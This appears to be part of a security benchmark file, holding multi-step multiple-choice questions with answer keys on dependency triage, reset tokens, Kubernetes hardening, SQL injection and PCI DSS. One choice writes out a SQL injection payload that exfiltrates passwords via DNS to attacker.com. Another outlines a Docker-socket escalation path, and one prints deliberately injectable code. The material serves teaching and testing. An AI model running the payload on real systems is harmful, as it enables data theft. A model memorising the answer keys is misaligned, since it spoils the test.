+      "question": "A pip-audit scan of a Python project returns:\n\nflask 2.2.0 (PYSEC-2023-62, CVSS 7.5 HIGH)\ncryptography 38.0.0 (CVE-2023-23931, CVSS 6.5 MEDIUM)\nrequests 2.28.0 (no known vulnerabilities)\npillow 9.0.0 (CVE-2023-44271, CVSS 7.5 HIGH)\n  (transitive via reportlab 3.6.0)\n\nStage 1: Which vulnerability should be addressed first and why? Stage 2: The pillow vulnerability is a transitive dependency via reportlab. The project does not use pillow directly. What are the options to fix it? Stage 3: After fixing, what process should be established to prevent this in the future?",
+      "choices": {
+        "A": "Stage 1: pillow because it is a transitive dependency. Stage 2: Fork reportlab and patch pillow. Stage 3: Avoid transitive dependencies entirely.",
+        "B": "Stage 1: cryptography because crypto vulnerabilities are always critical. Stage 2: Pin pillow to 9.0.0. Stage 3: Use Docker to isolate dependencies.",
+        "C": "Stage 1: Flask (PYSEC-2023-62, CVSS 7.5 HIGH) should be addressed first because it is a direct dependency of the web-facing application with a high severity network-exploitable vulnerability, making it the highest risk. The cryptography vuln is medium severity. Stage 2: Options for the transitive pillow vuln: (a) Update reportlab to a version that requires a patched pillow, (b) Add a direct pillow>=10.0.0 constraint to requirements.txt to force override the transitive version, (c) If reportlab is not actively used, remove it. Stage 3: Integrate pip-audit into CI/CD to fail builds on HIGH+ vulnerabilities, set up Dependabot/Renovate for automated PRs, schedule periodic full dependency audits, maintain an SBOM, and establish an SLA for vulnerability remediation (e.g., HIGH within 48h, CRITICAL within 24h).",
+        "D": "Stage 1: Fix requests first because it has no vulnerabilities (verify it stays clean). Stage 2: Remove pillow from the virtualenv. Stage 3: Run pip-audit monthly."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: Flask is direct, web-facing, and HIGH severity, making it the highest-risk item. Stage 2: Forcing a minimum version via direct constraint is the most practical fix for transitive vulnerabilities. Stage 3: Automated CI integration ensures vulnerabilities are caught early; SLAs ensure they are fixed promptly.",
+      "topic": "pip_audit_triage_chain",
+      "topic_category": "supply_chain",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC096",
+      "question": "An application implements password reset via email. The reset link format is: https://app.com/reset?token=BASE64(user_id:timestamp:HMAC(user_id+timestamp, secret_key)). Stage 1: What information does the token structure leak? Stage 2: If the HMAC secret_key is the same key used for JWT signing, what additional risk exists? Stage 3: Design a secure password reset token system.",
+      "choices": {
+        "A": "Stage 1: Base64 encoding (not encryption) means the user_id and timestamp are readable by anyone who intercepts the link. This reveals valid user IDs (user enumeration) and the timing of password reset requests. Stage 2: If an attacker obtains or brute-forces the secret_key through the reset token (e.g., via timing attack on HMAC verification or by analyzing many tokens), they can forge both reset tokens AND JWTs, compromising all authentication. Key reuse amplifies blast radius. Stage 3: Use a cryptographically random opaque token (secrets.token_urlsafe(32)), store its hash (SHA-256) in the database with an expiry and user association, and delete it after single use. No structured data in the URL. Separate signing keys for different purposes. Add rate limiting on the reset endpoint.",
+        "B": "Stage 1: The timestamp reveals server timezone. Stage 2: The attacker can forge expired tokens. Stage 3: Remove the timestamp from the token.",
+        "C": "Stage 1: The token leaks the HMAC algorithm. Stage 2: No additional risk; HMAC is secure. Stage 3: Use longer tokens.",
+        "D": "Stage 1: Nothing is leaked; Base64 is encryption. Stage 2: JWT and HMAC are unrelated. Stage 3: The current system is secure."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: Base64 is encoding, not encryption; all structured data is visible. Stage 2: Key reuse across systems means compromising one system compromises all systems using that key. Stage 3: Opaque random tokens stored server-side reveal nothing about the system's internals and isolate the password reset flow from other authentication mechanisms.",
+      "topic": "password_reset_token_design",
+      "topic_category": "auth",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC097",
+      "question": "A Kubernetes cluster runs a Python web application. The security team discovers the pod spec includes:\n\nspec:\n  containers:\n  - name: webapp\n    image: myapp:latest\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - name: docker-sock\n      mountPath: /var/run/docker.sock\n  volumes:\n  - name: docker-sock\n    hostPath:\n      path: /var/run/docker.sock\n\nStage 1: What are the two critical security issues? Stage 2: If an attacker achieves RCE in the container, describe the escalation path to cluster compromise. Stage 3: What is the hardened pod security configuration?",
+      "choices": {
+        "A": "Stage 1: (1) privileged: true gives the container full host kernel capabilities, effectively making it root on the host. (2) Docker socket mount gives the container full Docker daemon access, allowing creation of new privileged containers on the host. Stage 2: With RCE in the container, the attacker can: (a) use the Docker socket to create a new container with the host filesystem mounted, (b) access host /etc, install a backdoor, read kubelet credentials, (c) use kubelet credentials to access the Kubernetes API and compromise other pods/nodes. Stage 3: Remove privileged: true, remove Docker socket mount, add runAsNonRoot: true, readOnlyRootFilesystem: true, allowPrivilegeEscalation: false, drop all capabilities (capabilities: {drop: ['ALL']}), use a specific image tag (not :latest), and apply a PodSecurityStandard (restricted).",
+        "B": "Stage 1: (1) No liveness probe. (2) No network policy. Stage 2: The attacker scans the internal network. Stage 3: Add probes and network policies.",
+        "C": "Stage 1: (1) Single container (no sidecar). (2) No init container. Stage 2: Limited to the single container. Stage 3: Add a security sidecar.",
+        "D": "Stage 1: (1) Using :latest tag. (2) Missing resource limits. Stage 2: The attacker deploys a crypto miner. Stage 3: Pin the image tag and add resource limits."
+      },
+      "answer": "A",
+      "explanation": "Stage 1: privileged mode and Docker socket mount are the two most dangerous Kubernetes misconfigurations, each independently enabling full host compromise. Stage 2: Docker socket access is equivalent to root on the host. Stage 3: The restricted PodSecurityStandard enforces all these controls; each individual setting removes a specific capability that attackers rely on for escalation.",
+      "topic": "kubernetes_pod_security_chain",
+      "topic_category": "infrastructure",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC098",
+      "question": "A Python web application uses SQLAlchemy ORM. A developer writes:\n\nfrom sqlalchemy import text\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    sort_column = request.args.get('sort', 'name')\n    results = db.session.execute(\n        text(f\"SELECT * FROM products WHERE name LIKE '%{query}%' ORDER BY {sort_column}\")\n    ).fetchall()\n    return jsonify([dict(r) for r in results])\n\nStage 1: The developer argues 'I am using SQLAlchemy so I am safe from SQL injection.' Why is this wrong? Stage 2: Identify all injection points in this code. Stage 3: Rewrite using SQLAlchemy's query builder with proper parameterization.",
+      "choices": {
+        "A": "Stage 1: text() is deprecated and should use raw queries. Stage 2: Only the query parameter. Stage 3: Use db.engine.execute() instead.",
+        "B": "Stage 1: SQLAlchemy always prevents injection. Stage 2: No injection points. Stage 3: The code is already safe.",
+        "C": "Stage 1: Using SQLAlchemy's text() function with f-string formatting passes raw SQL to the engine. SQLAlchemy only protects against injection when using the ORM query API or text() with bound parameters (:param syntax). The f-string formatting happens BEFORE SQLAlchemy sees the query, making it identical to raw string concatenation. Stage 2: Two injection points: (1) the 'query' parameter in the LIKE clause, and (2) the 'sort_column' parameter in ORDER BY. Both use f-string concatenation. Stage 3: For the LIKE clause, use text('SELECT * FROM products WHERE name LIKE :q ORDER BY name').bindparams(q=f'%{query}%'). For the ORDER BY, whitelist allowed columns: ALLOWED = {'name','price','date'}; sort = sort_column if sort_column in ALLOWED else 'name'; then append it to the query string (safe because it comes from the allowlist, not user input).",
+        "D": "Stage 1: SQLAlchemy is only safe with PostgreSQL. Stage 2: Only the sort_column parameter. Stage 3: Use a different ORM."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: ORMs protect you when you use them correctly; text() with f-strings bypasses all ORM protections. Stage 2: Both user inputs are concatenated directly. Stage 3: Parameterized values for data, allowlist for identifiers -- the two different strategies required for the two different injection types.",
+      "topic": "sqlalchemy_false_safety_chain",
+      "topic_category": "python_security",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC099",
+      "question": "An incident response team detects unusual outbound DNS queries from a web server. The queries are for subdomains like 'aGVsbG8gd29ybGQ.exfil.attacker.com'. The web application has a blind SQL injection vulnerability. Stage 1: What technique is the attacker using and why? Stage 2: How does this technique extract data through a blind SQL injection? Stage 3: What detection and prevention controls should be implemented?",
+      "choices": {
+        "A": "Stage 1: DNS tunneling for command and control. Stage 2: The attacker sends commands via DNS. Stage 3: Block all DNS traffic.",
+        "B": "Stage 1: Subdomain enumeration. Stage 2: The attacker finds hidden endpoints. Stage 3: Remove DNS wildcard records.",
+        "C": "Stage 1: DNS exfiltration (out-of-band data extraction). The attacker encodes stolen data as subdomain labels in DNS queries. DNS is used because it often bypasses firewalls and egress filtering (port 53 is rarely blocked), and DNS queries are frequently not monitored or logged. Stage 2: The attacker injects SQL like: SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM users LIMIT 1), '.exfil.attacker.com\\\\a')) (MySQL UNC path) or uses UTL_HTTP/dbms_ldap (Oracle) to trigger a DNS lookup containing query results as the subdomain. Each query exfiltrates one row or value. Stage 3: Detection: monitor DNS query logs for high entropy subdomains, unusually long domain names, high query volumes to single domains, and queries to recently registered domains. Prevention: use a DNS sinkhole/firewall that blocks queries to unauthorized domains, restrict outbound DNS to internal resolvers only, fix the SQL injection vulnerability (root cause), and implement database egress controls.",
+        "D": "Stage 1: DNS cache poisoning. Stage 2: Redirect the server to a malicious database. Stage 3: Use DNSSEC."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: DNS exfiltration is a well-known technique for extracting data from networks with strict egress filtering. Stage 2: SQL injection payloads trigger server-side DNS lookups with data encoded in the subdomain. Stage 3: DNS monitoring is critical because most organizations do not inspect DNS traffic, making it an ideal covert channel. The root cause fix (SQL injection remediation) is essential.",
+      "topic": "dns_exfiltration_blind_sqli_chain",
+      "topic_category": "injection",
+      "difficulty": "expert",
+      "type": "multi_step"
+    },
+    {
+      "id": "SEC100",
+      "question": "A security architect reviews a Python application that handles PCI DSS cardholder data. The application:\n1. Accepts credit card numbers via HTTPS POST\n2. Stores them encrypted with AES-256-CBC in PostgreSQL\n3. Logs the full request body for debugging\n4. The encryption key is in an environment variable\n5. Backups of the database are stored in an S3 bucket with default settings\n\nStage 1: Identify all PCI DSS compliance violations in this architecture. Stage 2: Rank them by risk severity and explain why. Stage 3: Provide the remediation plan addressing each violation.",
+      "choices": {
+        "A": "Stage 1: HTTPS covers all PCI requirements. Stage 2: No ranking needed. Stage 3: The architecture is compliant.",
+        "B": "Stage 1: The database encryption and S3 are violations. Stage 2: S3 is highest risk. Stage 3: Enable S3 encryption and use RDS encryption.",
+        "C": "Stage 1: Violations: (1) Logging full request body includes card numbers in plaintext in logs (PCI DSS 3.4 - render PAN unreadable). (2) AES-CBC without authentication is vulnerable to padding oracle attacks; should use AES-GCM (PCI DSS 3.5). (3) Encryption key in environment variable lacks proper key management (PCI DSS 3.5/3.6 - key management procedures). (4) S3 default settings mean the bucket may not have encryption at rest, access logging, or restricted access (PCI DSS 3.4, 9.5). (5) No mention of tokenization to minimize cardholder data exposure scope. Stage 2: (1) Plaintext card numbers in logs is highest risk -- logs are often widely accessible, replicated to log aggregation services, and retained long-term. (2) S3 misconfiguration is second -- backup data exposure affects all historical records. (3) Key in env var is third -- environment variables leak to child processes and crash dumps. (4) AES-CBC without auth is fourth -- requires active exploitation. Stage 3: (1) Immediately stop logging request bodies; implement field-level masking showing only last 4 digits. (2) Enable S3 bucket encryption, block public access, enable access logging, restrict IAM policies. (3) Migrate encryption keys to a dedicated KMS/HSM with automated rotation. (4) Switch to AES-256-GCM for authenticated encryption. (5) Implement tokenization to reduce PCI scope -- store tokens, not card numbers, in the application database.",
+        "D": "Stage 1: Only the logging issue is a violation. Stage 2: All violations are equal severity. Stage 3: Stop logging and add a WAF."
+      },
+      "answer": "C",
+      "explanation": "Stage 1: PCI DSS has multiple requirements covering storage, logging, key management, and backup security. Each gap represents a separate compliance failure. Stage 2: Plaintext card numbers in logs is the most immediate and exploitable risk because log data has the widest exposure surface. Stage 3: Defense-in-depth across logging, storage, key management, encryption mode, and scope minimization via tokenization.",
+      "topic": "pci_dss_architecture_review",
+      "topic_category": "infrastructure",
+      "difficulty": "expert",
+      "type": "multi_step"
+    }
+  ]
+}
